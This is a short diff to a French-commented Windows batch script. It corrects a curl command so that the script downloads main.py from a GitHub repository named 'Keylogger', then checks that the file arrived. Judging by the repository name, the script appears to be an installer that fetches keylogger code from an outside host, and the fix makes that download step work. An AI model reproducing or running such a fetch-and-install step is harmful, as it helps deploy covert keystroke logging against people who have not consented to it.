@@ -29,7 +29,7 @@ if errorlevel 1 (
 
 REM Télécharger le fichier main.py depuis un dépôt GitHub
 echo Téléchargement de main.py depuis GitHub...
-curl -O https://raw.githubusercontent.com/coco324/Keylogger/blob/main/main.py
+curl -O https://raw.githubusercontent.com/coco324/Keylogger/main/main.py
 
 REM Vérifier si le fichier main.py a été téléchargé
 if exist main.py (
